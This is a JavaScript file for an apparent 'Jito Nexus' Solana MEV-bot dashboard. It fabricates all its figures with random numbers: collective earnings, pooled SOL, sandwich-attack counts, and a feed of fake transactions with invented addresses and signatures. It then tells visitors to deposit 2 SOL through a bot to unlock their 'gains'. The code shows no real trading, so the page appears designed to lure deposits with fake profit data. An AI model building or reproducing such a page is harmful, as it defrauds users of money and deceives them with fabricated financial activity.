let currentBalance = 0;
let pooledSol = 10000; // Starting pooled SOL
let sandwichAttacks = 0; // Starting sandwich attacks
let startTime;
let chart;
let transactions = [];

console.log("Script loaded");

document.addEventListener("DOMContentLoaded", function() {
    console.log("DOM fully loaded");
    initializeApp();
    setInterval(updateApp, 1000); // Update every second
    setInterval(addNewTransaction, 1000); // Add a new transaction every second
});

function initializeApp() {
    console.log("Initializing app");
    loadSavedData();
    if (!startTime) {
        startTime = new Date();
        currentBalance = Math.random() * (16000 - 145) + 145;
    }
    updateTodayStats();
    initializeWallet();
    updateMyGains();
    initializeTransactions();
    initializeStatsGraph();
    explainChartLines();
    showTab('today-stats'); // Show Today's Stats tab by default
}

function loadSavedData() {
    const savedBalance = localStorage.getItem('currentBalance');
    const savedStartTime = localStorage.getItem('startTime');
    if (savedBalance && savedStartTime) {
        currentBalance = parseFloat(savedBalance);
        startTime = new Date(parseInt(savedStartTime));
        console.log("Loaded saved data:", currentBalance, startTime);
    }
}

function saveData() {
    localStorage.setItem('currentBalance', currentBalance.toString());
    localStorage.setItem('startTime', startTime.getTime().toString());
    console.log("Saved data:", currentBalance, startTime);
}

function updateApp() {
    const now = new Date();
    if (now - startTime >= 24 * 60 * 60 * 1000) {
        console.log("24 hours passed, resetting");
        startTime = new Date();
        currentBalance = Math.random() * (16000 - 145) + 145;
        pooledSol = 10000;
        sandwichAttacks = 0;
        transactions = [];
    } else {
        updateTodayStats();
    }
    saveData();
}

function updateTodayStats() {
    // Increase by approximately 30 SOL per minute (0.5 SOL per second)
    currentBalance += 0.5 * (Math.random() * 0.2 + 0.9); // Random factor between 0.9 and 1.1 for slight variation
    
    // Update pooled SOL
    pooledSol += (Math.random() - 0.5) * 100; // Random increase or decrease
    pooledSol = Math.max(500, Math.min(20000, pooledSol)); // Keep between 500 and 20000

    // Update sandwich attacks
    sandwichAttacks += Math.floor(Math.random() * 3); // Random increase between 0 and 2

    console.log("Updating stats, current balance:", currentBalance.toFixed(2));

    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL Gained`;
    document.getElementById("pooled-sol").textContent = `${pooledSol.toFixed(2)} SOL Pooled`;
    document.getElementById("sandwich-attacks").textContent = `${sandwichAttacks} Sandwich Attacks`;
    document.getElementById("stats-description").textContent = 
        `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
    updateStatsGraph();
}

function initializeWallet() {
    console.log("Initializing wallet");
    document.getElementById("wallet-instructions").innerHTML = 
        "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type <strong>/get_wallet</strong>. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
}

function updateMyGains() {
    console.log("Updating gains");
    const gainsContent = document.getElementById("gains-content");
    gainsContent.innerHTML = `
        <span class="lock-icon">🔒</span>
        <p id="gains-message">To access your gains, please deposit 2 SOL. Head to the bot and type <strong>/get_wallet</strong> to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!</p>
    `;
}

function initializeTransactions() {
    for (let i = 0; i < 150; i++) {
        addNewTransaction();
    }
    displayTransactions();
}

function addNewTransaction() {
    const newTransaction = generateTransaction();
    transactions.unshift(newTransaction);
    if (transactions.length > 150) {
        transactions.pop();
    }
    displayTransactions();
}

function generateTransaction() {
    const types = ['transfer', 'swap', 'other'];
    const type = types[Math.floor(Math.random() * types.length)];
    const amount = type === 'transfer' ? (Math.random() * 10).toFixed(4) + ' SOL' : (type === 'swap' ? 'Token Swap' : 'Unknown');
    return {
        type: type,
        amount: amount,
        time: new Date().toLocaleTimeString(),
        fromAddress: generateRandomAddress(),
        toAddress: type === 'transfer' ? generateRandomAddress() : 'N/A',
        signature: generateValidSignature()
    };
}

function generateRandomAddress() {
    return 'Sol' + Math.random().toString(36).substring(2, 10);
}

function generateValidSignature() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let signature = '';
    for (let i = 0; i < 88; i++) {
        signature += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return signature;
}

function displayTransactions() {
    console.log("Displaying transactions");
    const transactionsList = document.getElementById("transactions-list");
    transactionsList.innerHTML = '';
    transactions.forEach(tx => {
        const txElement = document.createElement('div');
        txElement.className = 'transaction';
        if (tx.type === 'transfer') {
            txElement.innerHTML = `
                <h3>Transfer</h3>
                <p>${tx.amount} transferred at ${tx.time}</p>
                <p>From: ${tx.fromAddress}</p>
                <p>To: ${tx.toAddress}</p>
            `;
        } else if (tx.type === 'swap') {
            txElement.innerHTML = `
                <h3>Swap</h3>
                <p>Token Swap occurred at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        } else {
            txElement.innerHTML = `
                <h3>Other Transaction</h3>
                <p>Unknown transaction type at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        }
        transactionsList.appendChild(txElement);
    });
}

function showTab(tabId) {
    console.log("Showing tab:", tabId);
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.style.display = "none";
    }
    document.getElementById(tabId).style.display = "block";
}

function initializeStatsGraph() {
    console.log("Initializing stats graph");
    const ctx = document.getElementById('stats-graph');
    if (!ctx) {
        console.error("Canvas element not found");
        return;
    }
    chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'SOL Gained',
                data: [],
                borderColor: 'rgba(0, 255, 255, 1)',
                borderWidth: 2,
                fill: false,
                pointRadius: 0
            },
            {
                label: 'SOL Pooled',
                data: [],
                borderColor: 'rgba(255, 0, 0, 1)',
                borderWidth: 2,
                fill: false,
                pointRadius: 0
            },
            {
                label: 'Sandwich Attacks',
                data: [],
                borderColor: 'rgba(0, 255, 0, 1)',
                borderWidth: 2,
                fill: false,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            animation: {
                duration: 0
            },
            scales: {
                x: {
                    type: 'time',
                    time: {
                        unit: 'minute',
                        displayFormats: {
                            minute: 'HH:mm'
                        }
                    },
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)',
                        maxRotation: 0,
                        autoSkip: true,
                        maxTicksLimit: 5
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                },
                y: {
                    beginAtZero: false,
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                }
            },
            plugins: {
                legend: {
                    display: true,
                    labels: {
                        color: 'rgba(255, 255, 255, 0.7)',
                        boxWidth: 12,
                        padding: 10
                    }
                },
                tooltip: {
                    mode: 'index',
                    intersect: false
                }
            }
        }
    });
}

function updateStatsGraph() {
    if (!chart) {
        console.error("Chart not initialized");
        return;
    }
    console.log("Updating stats graph");
    const now = new Date();
    chart.data.labels.push(now);
    chart.data.datasets[0].data.push(currentBalance);
    chart.data.datasets[1].data.push(pooledSol);
    chart.data.datasets[2].data.push(sandwichAttacks);
    if (chart.data.labels.length > 100) {
        chart.data.labels.shift();
        chart.data.datasets[0].data.shift();
        chart.data.datasets[1].data.shift();
        chart.data.datasets[2].data.shift();
    }
    chart.update();
}

function explainChartLines() {
    const explanation = document.createElement('div');
    explanation.innerHTML = `
        <p id="sol-balance" style="color: rgba(0, 255, 255, 1); font-size: 18px; font-weight: bold; margin-top: 10px;"></p>
        <p id="pooled-sol" style="color: rgba(255, 0, 0, 1); font-size: 18px; font-weight: bold; margin-top: 5px;"></p>
        <p id="sandwich-attacks" style="color: rgba(0, 255, 0, 1); font-size: 18px; font-weight: bold; margin-top: 5px;"></p>
        <p style="color: rgba(0, 255, 255, 0.7); font-size: 14px; margin-top: 10px;">The blue line represents the SOL gained by all users collectively.</p>
        <p style="color: rgba(255, 0, 0, 0.7); font-size: 14px; margin-top: 5px;">The red line represents the SOL pooled by all users together to perform MEV attacks. This pool fluctuates as users contribute and withdraw funds, and as MEV opportunities are exploited.</p>
        <p style="color: rgba(0, 255, 0, 0.7); font-size: 14px; margin-top: 5px;">The green line represents the number of successful sandwich attacks performed.</p>
    `;
    document.getElementById('today-stats').appendChild(explanation);
}